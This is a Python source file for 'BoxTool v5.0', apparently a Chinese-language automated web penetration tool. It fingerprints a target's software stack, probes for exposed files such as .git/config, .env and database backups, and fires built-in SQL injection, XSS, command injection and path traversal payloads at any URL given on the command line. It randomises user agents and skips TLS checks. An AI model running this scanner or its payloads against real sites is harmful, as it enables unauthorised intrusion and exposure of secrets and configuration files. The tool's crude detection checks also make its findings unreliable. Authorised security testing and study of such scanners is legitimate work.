#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BoxTool v5.0 - AI Web 自动化渗透模块
商业级实现：技术栈识别、漏洞扫描、自动化渗透
"""
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode
from datetime import datetime

# 禁用 SSL 警告
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class AIModule:
    """AI Web 自动化渗透模块 - 商业级实现"""

    # CMS 特征库
    CMS_SIGNATURES = {
        'WordPress': ['wp-content', 'wp-includes', 'wp-json', 'wp-login.php'],
        'Joomla': ['Joomla!', 'media/jui', 'components/com', 'mod_login'],
        'Drupal': ['Drupal.settings', 'sites/default', 'core/misc'],
        'DedeCMS': ['dede/tag.php', 'data/common.inc.php', 'plus/view.php'],
        'Discuz': ['discuz_version', 'static/image', 'source/class'],
        'EmpireCMS': ['empirecms', 'e/class/connect.php'],
        'PHPCMS': ['phpcms', 'caches/configs.php'],
        'Typecho': ['typecho', 'usr/themes'],
    }

    # 框架特征库
    FRAMEWORK_SIGNATURES = {
        'ThinkPHP': ['ThinkPHP', 'thinkphp', '__think__', 'X-Powered-By: ThinkPHP'],
        'Laravel': ['laravel_session', 'XSRF-TOKEN', 'csrf_token'],
        'Spring': ['Spring', 'org.springframework', 'JSESSIONID'],
        'Django': ['csrftoken', 'django', 'sessionid'],
        'Flask': ['Werkzeug', 'flask', 'secure cookie'],
        'Express': ['Express', 'x-powered-by: express', 'connect.sid'],
        'ASP.NET': ['ASP.NET', '__VIEWSTATE', 'X-AspNet-Version'],
        'Ruby on Rails': ['Ruby on Rails', 'action_controller', '_session_id'],
        'PHP': ['PHP/', 'X-Powered-By: PHP'],
        'Java': ['Java/', 'JSP', 'Servlet'],
    }

    # Web 服务器特征
    SERVER_SIGNATURES = {
        'Nginx': ['nginx'],
        'Apache': ['Apache'],
        'IIS': ['IIS', 'Microsoft-IIS'],
        'Tomcat': ['Tomcat', 'Coyote'],
        'OpenResty': ['openresty'],
    }

    # 敏感路径字典
    SENSITIVE_PATHS = [
        # 后台
        'admin', 'admin/login', 'administrator', 'manage', 'manager',
        'wp-admin', 'wp-login.php', 'user/login', 'admin.php', 'login.php',
        # 配置文件
        '.git/config', '.git/HEAD', '.env', 'config.php', 'config.ini',
        'web.config', 'application.yml', 'database.yml', 'settings.py',
        # 备份
        'backup.zip', 'backup.sql', 'backup.tar.gz', 'www.zip', 'www.rar',
        'index.php.bak', 'config.php.bak', 'database.sql.gz',
        # API
        'api', 'api/v1', 'api/v2', 'swagger', 'swagger-ui.html',
        'api-docs', 'graphql', 'graphiql', 'openapi.json',
        # 测试
        'phpinfo.php', 'info.php', 'test.php', 'debug.php', 'robots.txt',
    ]

    # SQL 注入 Payload
    SQLI_PAYLOADS = [
        ("' OR '1'='1", "Boolean Based"),
        ("' UNION SELECT NULL-- -", "UNION Based"),
        ("'; WAITFOR DELAY '0:0:5'--", "Time Based"),
        ("1 AND 1=1", "Simple"),
        ("admin'--", "Comment"),
        ("' AND '1'='1' UNION SELECT NULL,NULL,NULL-- -", "Extended UNION"),
    ]

    # XSS Payload
    XSS_PAYLOADS = [
        ("<script>alert(1)</script>", "Script Tag"),
        ("'><img src=x onerror=alert(1)>", "Img Error"),
        ("javascript:alert(1)", "JS Protocol"),
        ("<svg/onload=alert(1)>", "SVG"),
        ("'><iframe src=javascript:alert(1)>", "Iframe"),
    ]

    # 命令注入 Payload
    CMDI_PAYLOADS = [
        ("; whoami", "Linux Whoami"),
        ("| whoami", "Pipe"),
        ("&& whoami", "AND"),
        ("`whoami`", "Backtick"),
        ("$(whoami)", "Subshell"),
    ]

    # 文件包含 Payload
    LFI_PAYLOADS = [
        ("../../../../etc/passwd", "Linux /etc/passwd"),
        ("....//....//....//etc/passwd", "Bypass Filter"),
        ("../../../../windows/win.ini", "Windows"),
        ("php://filter/convert.base64-encode/resource=index.php", "PHP Filter"),
    ]

    @staticmethod
    def get_headers():
        """获取随机化请求头"""
        import random
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ]
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
        }

    @staticmethod
    def tech_stack_detect(url):
        """技术栈识别 - CMS/框架/服务器"""
        results = []
        try:
            r = requests.get(url, timeout=15, headers=AIModule.get_headers(), verify=False, allow_redirects=True)
            html = r.text.lower()
            headers_lower = {k.lower(): v.lower() for k, v in r.headers.items()}
            
            # CMS 识别
            for cms, sigs in AIModule.CMS_SIGNATURES.items():
                if any(sig.lower() in html for sig in sigs):
                    results.append(f"[+] CMS 识别：{cms}")
                    break
            
            # 框架识别
            for fw, sigs in AIModule.FRAMEWORK_SIGNATURES.items():
                if any(sig.lower() in html or sig.lower() in str(headers_lower) for sig in sigs):
                    results.append(f"[+] 框架识别：{fw}")
                    break
            
            # 服务器识别
            server = headers_lower.get('server', '')
            for srv, keywords in AIModule.SERVER_SIGNATURES.items():
                if any(kw.lower() in server for kw in keywords):
                    results.append(f"[+] Web 服务器：{srv}")
                    break
            
            # CDN/WAF 识别
            if 'cf-ray' in headers_lower:
                results.append("[+] CDN/WAF: Cloudflare")
            if 'x-amz-cf-id' in headers_lower:
                results.append("[+] CDN: Amazon CloudFront")
            if 'x-cache' in headers_lower and 'cloudflare' in headers_lower.get('x-cache', ''):
                results.append("[+] CDN: Cloudflare")
            
            if not results:
                results.append("[-] 无法识别具体技术栈")
                
        except Exception as e:
            results.append(f"[!] 技术栈识别失败：{str(e)}")
        
        return "\n".join(results)

    @staticmethod
    def dir_enum(url, wordlist=None):
        """目录枚举 - 发现隐藏路径"""
        paths = wordlist or AIModule.SENSITIVE_PATHS
        found = []
        base_url = url.rstrip('/')
        
        for path in paths:
            target = f"{base_url}/{path}"
            try:
                r = requests.get(target, timeout=5, headers=AIModule.get_headers(), verify=False, allow_redirects=False)
                if r.status_code == 200:
                    found.append(f"[200] {path} (长度：{len(r.text)})")
                elif r.status_code in [301, 302, 307]:
                    location = r.headers.get('location', '')
                    found.append(f"[{r.status_code}] {path} -> {location}")
                elif r.status_code == 403:
                    found.append(f"[403] {path} (禁止访问 - 可能存在)")
            except:
                pass
        
        if found:
            return f"发现 {len(found)} 个敏感路径:\n" + "\n".join(found)
        return "[-] 未发现敏感路径"

    @staticmethod
    def sqli_scan(url):
        """SQL 注入扫描 - 真实 Payload 测试"""
        results = []
        test_params = ['id', 'page', 'search', 'query', 'user', 'cat', 'article']
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # 检测 URL 参数
        if not params:
            for param in test_params:
                test_url = f"{url}?{param}=1"
                for payload, vuln_name in AIModule.SQLI_PAYLOADS[:3]:
                    test_url_payload = f"{test_url}{payload}"
                    try:
                        r = requests.get(test_url_payload, timeout=10, headers=AIModule.get_headers(), verify=False)
                        if any(err in r.text.lower() for err in ['sql syntax', 'mysql_fetch', 'ORA-', 'postgresql', 'sqlite3', 'warning.*mysql']):
                            results.append(f"[+] SQL 注入 ({vuln_name}) - 参数：{param}")
                    except:
                        pass
        else:
            # 已有参数，测试注入
            for param in params.keys():
                for payload, vuln_name in AIModule.SQLI_PAYLOADS[:3]:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    try:
                        r = requests.get(test_url, timeout=10, headers=AIModule.get_headers(), verify=False)
                        if any(err in r.text.lower() for err in ['sql syntax', 'mysql_fetch', 'ORA-', 'postgresql', 'sqlite3']):
                            results.append(f"[+] SQL 注入 ({vuln_name}) - 参数：{param}")
                    except:
                        pass
        
        if results:
            return f"发现 {len(results)} 个 SQL 注入点:\n" + "\n".join(results)
        return "[-] 未发现 SQL 注入点"

    @staticmethod
    def xss_scan(url):
        """XSS 扫描 - 真实 Payload 反射测试"""
        results = []
        test_params = ['q', 'search', 'query', 'keyword', 's', 'name']
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in (params.keys() if params else test_params):
            for payload, vuln_name in AIModule.XSS_PAYLOADS[:3]:
                test_params_dict = {param: payload}
                test_url = f"{url}&{urlencode(test_params_dict)}" if parsed.query else f"{url}?{urlencode(test_params_dict)}"
                try:
                    r = requests.get(test_url, timeout=10, headers=AIModule.get_headers(), verify=False)
                    if payload in r.text:
                        # 检查是否被转义
                        if '<script>' in r.text and '&lt;script&gt;' not in r.text:
                            results.append(f"[+] XSS ({vuln_name}) - 参数：{param}")
                except:
                    pass
        
        if results:
            return f"发现 {len(results)} 个 XSS 漏洞:\n" + "\n".join(results)
        return "[-] 未发现 XSS 漏洞"

    @staticmethod
    def cmdi_scan(url):
        """命令注入扫描"""
        results = []
        test_params = ['ip', 'host', 'ping', 'cmd', 'exec', 'command']
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in (params.keys() if params else test_params):
            for payload, vuln_name in AIModule.CMDI_PAYLOADS[:2]:
                test_params_dict = {param: payload}
                test_url = f"{url}&{urlencode(test_params_dict)}" if parsed.query else f"{url}?{urlencode(test_params_dict)}"
                try:
                    r = requests.get(test_url, timeout=10, headers=AIModule.get_headers(), verify=False)
                    if any(indicator in r.text.lower() for indicator in ['root:', 'uid=', 'user:', 'administrator']):
                        results.append(f"[+] 命令注入 ({vuln_name}) - 参数：{param}")
                except:
                    pass
        
        if results:
            return f"发现 {len(results)} 个命令注入点:\n" + "\n".join(results)
        return "[-] 未发现命令注入点"

    @staticmethod
    def lfi_scan(url):
        """文件包含扫描"""
        results = []
        test_params = ['file', 'page', 'include', 'path', 'template']
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in (params.keys() if params else test_params):
            for payload, vuln_name in AIModule.LFI_PAYLOADS[:2]:
                test_params_dict = {param: payload}
                test_url = f"{url}&{urlencode(test_params_dict)}" if parsed.query else f"{url}?{urlencode(test_params_dict)}"
                try:
                    r = requests.get(test_url, timeout=10, headers=AIModule.get_headers(), verify=False)
                    if 'root:' in r.text and '/bin/bash' in r.text:
                        results.append(f"[+] 文件包含 ({vuln_name}) - 参数：{param}")
                except:
                    pass
        
        if results:
            return f"发现 {len(results)} 个文件包含漏洞:\n" + "\n".join(results)
        return "[-] 未发现文件包含漏洞"

    @staticmethod
    def api_enum(url):
        """API 端点发现"""
        results = []
        api_paths = [
            '/api', '/api/v1', '/api/v2', '/api/v3',
            '/graphql', '/graphiql', '/playground',
            '/swagger', '/swagger-ui.html', '/swagger.json',
            '/api-docs', '/openapi.json', '/docs',
        ]
        base_url = url.rstrip('/')
        
        for path in api_paths:
            target = f"{base_url}{path}"
            try:
                r = requests.get(target, timeout=8, headers=AIModule.get_headers(), verify=False)
                if r.status_code == 200 and len(r.text) > 100:
                    content_type = r.headers.get('content-type', '')
                    if 'json' in content_type or 'swagger' in target or 'graphql' in target:
                        results.append(f"[+] API 端点：{path} ({content_type})")
            except:
                pass
        
        if results:
            return f"发现 {len(results)} 个 API 端点:\n" + "\n".join(results)
        return "[-] 未发现 API 端点"

    @staticmethod
    def info_crawl(url, depth=2):
        """智能信息收集"""
        results = []
        results.append("=" * 60)
        results.append(f"AI 信息收集：{url}")
        results.append("=" * 60)
        results.append("")
        
        # 1. 技术栈识别
        results.append("[1] 技术栈识别:")
        results.append(AIModule.tech_stack_detect(url))
        results.append("")
        
        # 2. 目录枚举
        results.append("[2] 敏感路径枚举:")
        results.append(AIModule.dir_enum(url))
        results.append("")
        
        # 3. API 端点发现
        results.append("[3] API 端点发现:")
        results.append(AIModule.api_enum(url))
        results.append("")
        
        # 4. 基础爬虫
        results.append("[4] 页面链接收集:")
        try:
            r = requests.get(url, timeout=15, headers=AIModule.get_headers(), verify=False)
            soup = BeautifulSoup(r.text, 'html.parser')
            links = []
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href.startswith('http') or href.startswith('/'):
                    links.append(href)
            if links:
                results.append(f"发现 {len(links)} 个链接，前 20 个:")
                results.append("\n".join(list(set(links))[:20]))
            else:
                results.append("[-] 未发现外部链接")
        except Exception as e:
            results.append(f"[!] 爬取失败：{str(e)}")
        
        return "\n".join(results)

    @staticmethod
    def vuln_scan(url):
        """综合漏洞扫描"""
        results = []
        results.append("=" * 60)
        results.append(f"AI 漏洞扫描：{url}")
        results.append("=" * 60)
        results.append("")
        
        # 1. SQL 注入扫描
        results.append("[1] SQL 注入扫描:")
        results.append(AIModule.sqli_scan(url))
        results.append("")
        
        # 2. XSS 扫描
        results.append("[2] XSS 扫描:")
        results.append(AIModule.xss_scan(url))
        results.append("")
        
        # 3. 命令注入扫描
        results.append("[3] 命令注入扫描:")
        results.append(AIModule.cmdi_scan(url))
        results.append("")
        
        # 4. 文件包含扫描
        results.append("[4] 文件包含扫描:")
        results.append(AIModule.lfi_scan(url))
        
        return "\n".join(results)

    @staticmethod
    def auto_pentest(url):
        """一键全自动化渗透测试"""
        results = []
        results.append("=" * 70)
        results.append(f"  BoxTool v5.0 - AI 自动化渗透测试报告")
        results.append(f"  目标：{url}")
        results.append(f"  时间：{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append("=" * 70)
        results.append("")
        
        # 阶段 1: 信息收集
        results.append("【阶段 1】信息收集")
        results.append("-" * 70)
        results.append(AIModule.info_crawl(url))
        results.append("")
        
        # 阶段 2: 漏洞扫描
        results.append("【阶段 2】漏洞扫描")
        results.append("-" * 70)
        results.append(AIModule.vuln_scan(url))
        results.append("")
        
        # 阶段 3: 敏感文件检测
        results.append("【阶段 3】敏感文件检测")
        results.append("-" * 70)
        results.append("需要 WebModule 支持")
        results.append("")
        
        # 阶段 4: WAF 检测
        results.append("【阶段 4】WAF 检测")
        results.append("-" * 70)
        results.append("需要 WebModule 支持")
        results.append("")
        
        # 总结
        results.append("=" * 70)
        results.append("【渗透测试完成】")
        results.append("=" * 70)
        
        return "\n".join(results)


# 测试入口
if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target = sys.argv[1]
        print(AIModule.auto_pentest(target))
    else:
        print("用法：python ai_module.py <URL>")
